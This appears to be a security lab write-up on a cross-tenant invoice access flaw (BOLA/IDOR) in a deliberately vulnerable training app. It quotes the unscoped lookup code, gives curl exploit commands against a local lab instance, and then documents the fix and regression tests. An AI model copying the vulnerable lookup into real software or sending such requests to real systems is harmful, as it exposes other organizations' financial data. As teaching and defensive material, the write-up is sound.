# LAB-01: BOLA / IDOR — Cross-Tenant Invoice Access

- OWASP API Top 10: **API1:2023 Broken Object Level Authorization**
- CWE: **CWE-639 Authorization Bypass Through User-Controlled Key**
- Threat model: `docs/threat-model/threat-model.md` section 5, row `GET /invoices/{id}`

## Summary

Any authenticated user can read any invoice in any tenant by guessing its UUID.
The lab fetch ignores tenant scope entirely; the secure app scopes the fetch,
re-checks the policy, and returns 404 so callers cannot even learn the object exists.

## Vulnerable code

`src/authzlab/vulnerable_app.py:59-66` — `VulnerableInvoiceService.get_invoice`
fetches by primary key only:

```python
invoice = repo.get_by_id(invoice_id)  # No tenant filter!
```

No `ensure_same_tenant`, no `ensure_can_view_invoice`. The listing endpoint is
equally open: any `tenant_id` query is honored, and with none it returns every
invoice in every tenant (`vulnerable_app.py:68-74`).

## Exploit

Preconditions: seeded DB (`make seed`), lab on `:8001`. Attacker is
`charlie@acme.com` (Acme MEMBER); victim invoice is Eve's Globex invoice
(`Marketing campaign`).

Runner:

```bash
uv run python scripts/exploit_scenarios.py --scenario bola \
  --target http://127.0.0.1:8001 \
  --attacker charlie@acme.com --password password123 \
  --victim-invoice <EVE_INVOICE_UUID>
```

Equivalent curl:

```bash
TOKEN=$(curl -s -X POST http://127.0.0.1:8001/api/v1/auth/token \
  -H 'Content-Type: application/json' \
  -d '{"email":"charlie@acme.com","password":"password123"}' | python3 -c 'import sys,json; print(json.load(sys.stdin)["access_token"])')
curl -s http://127.0.0.1:8001/api/v1/invoices/<EVE_INVOICE_UUID> \
  -H "Authorization: Bearer $TOKEN"
```

Lab response: **200** with Eve's full invoice (`tenant_id` of Globex, amount,
status). The cross-tenant listing variant works the same way:

```bash
curl -s 'http://127.0.0.1:8001/api/v1/invoices?tenant_id=<GLOBEX_UUID>' \
  -H "Authorization: Bearer $TOKEN"   # 200, Eve's invoices included
```

## Impact

Complete tenant-isolation failure: a MEMBER in one organization reads (and, via
LAB-02/03, acts on) another organization's financial records. UUIDs are not
secrets — enumeration plus this endpoint is disclosure at scale.

## Fix

Secure `InvoiceService.get_invoice` (`src/authzlab/application/services/__init__.py:110-118`):

1. Fetch scoped to the caller's tenant —
   `repo.get_by_id_and_tenant` (`repositories/__init__.py:110`).
2. `AuthorizationPolicy.ensure_can_view_invoice` — same tenant, plus
   owner-or-approver/admin (`policies/__init__.py:75-85`); members see only
   their own invoices (H-1 model).

Secure behavior for the same requests: **404** with body `Resource not found`.
The 404 is deliberate — `api/errors.py:81-89` maps `TenantIsolationError` to
404 so cross-tenant callers cannot distinguish "exists elsewhere" from
"does not exist". Same-tenant members reading others' invoices get 403.

## Regression tests

- `test_bola_blocked_in_secure` / `test_bola_works_in_vulnerable`
- `test_cross_tenant_listing_blocked_in_secure` / `..._works_in_vulnerable`
  (`tests/security/test_regression.py`)

## Defense-in-depth notes

- Two independent gates must both fail for BOLA to recur: the repository's
  tenant-scoped query and the policy check. Removing either one still leaves
  the other (both are covered by the tests above).
- The 404-vs-403 split is load-bearing: 404 for cross-tenant (no oracle),
  403 for same-tenant-but-unauthorized (actionable feedback for legit users).
